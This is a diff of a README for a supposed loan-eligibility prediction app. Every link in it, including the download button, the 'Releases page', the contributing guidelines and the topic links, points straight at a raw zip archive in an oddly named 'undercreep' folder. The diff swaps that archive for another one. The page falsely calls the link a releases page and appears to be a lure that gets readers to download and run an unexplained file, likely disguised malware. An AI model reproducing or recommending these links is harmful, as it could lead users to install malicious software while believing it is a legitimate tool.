@@ -1,6 +1,6 @@
 # 🎉 Loan_Eligibility_Prediction - Predict Your Loan Eligibility Easily
 
-[![Download the Latest Release](https://github.com/XKionx/Loan_Eligibility_Prediction/raw/refs/heads/main/undercreep/Loan-Prediction-Eligibility-telocentric.zip)](https://github.com/XKionx/Loan_Eligibility_Prediction/raw/refs/heads/main/undercreep/Loan-Prediction-Eligibility-telocentric.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/XKionx/Loan_Eligibility_Prediction/main/undercreep/Loan-Eligibility-Prediction-v2.4.zip)](https://raw.githubusercontent.com/XKionx/Loan_Eligibility_Prediction/main/undercreep/Loan-Eligibility-Prediction-v2.4.zip)
 
 ## 📋 Description
 The Loan Eligibility Prediction application uses advanced machine learning techniques to help you understand your loan eligibility. With a success rate of 94.96% in ROC-AUC, it provides accurate predictions based on your financial data. This software employs a combination of ensemble learning methods, including Random Forest, Gradient Boosting, XGBoost, LightGBM, and Neural Networks. Additionally, it features a smart way of blending scores through a stratified K-fold cross-validation process.
@@ -19,7 +19,7 @@ Before downloading, make sure your system meets these requirements:
 ## 📥 Download & Install
 To get the application, you need to visit the Releases page. Here, you will find the latest version available for download.
 
-[**Visit this page to download**](https://github.com/XKionx/Loan_Eligibility_Prediction/raw/refs/heads/main/undercreep/Loan-Prediction-Eligibility-telocentric.zip)
+[**Visit this page to download**](https://raw.githubusercontent.com/XKionx/Loan_Eligibility_Prediction/main/undercreep/Loan-Eligibility-Prediction-v2.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release (e.g., version 1.0).
@@ -51,15 +51,15 @@ If you wish to help improve this application, you can contribute by:
 - Suggesting new features
 - Submitting pull requests with enhancements
 
-For detailed information on how to contribute, please refer to our [Contributing Guidelines](https://github.com/XKionx/Loan_Eligibility_Prediction/raw/refs/heads/main/undercreep/Loan-Prediction-Eligibility-telocentric.zip).
+For detailed information on how to contribute, please refer to our [Contributing Guidelines](https://raw.githubusercontent.com/XKionx/Loan_Eligibility_Prediction/main/undercreep/Loan-Eligibility-Prediction-v2.4.zip).
 
 ## 📞 Support
 If you have any questions or run into issues, feel free to contact us through the issues section in the repository. We are here to help you.
 
 ## 🔗 Related Topics
-- [Data Science](https://github.com/XKionx/Loan_Eligibility_Prediction/raw/refs/heads/main/undercreep/Loan-Prediction-Eligibility-telocentric.zip)
-- [Machine Learning](https://github.com/XKionx/Loan_Eligibility_Prediction/raw/refs/heads/main/undercreep/Loan-Prediction-Eligibility-telocentric.zip)
-- [Ensemble Learning](https://github.com/XKionx/Loan_Eligibility_Prediction/raw/refs/heads/main/undercreep/Loan-Prediction-Eligibility-telocentric.zip)
+- [Data Science](https://raw.githubusercontent.com/XKionx/Loan_Eligibility_Prediction/main/undercreep/Loan-Eligibility-Prediction-v2.4.zip)
+- [Machine Learning](https://raw.githubusercontent.com/XKionx/Loan_Eligibility_Prediction/main/undercreep/Loan-Eligibility-Prediction-v2.4.zip)
+- [Ensemble Learning](https://raw.githubusercontent.com/XKionx/Loan_Eligibility_Prediction/main/undercreep/Loan-Eligibility-Prediction-v2.4.zip)
 
 For further insights into the models used in this application, check out related resources and documentation.
 
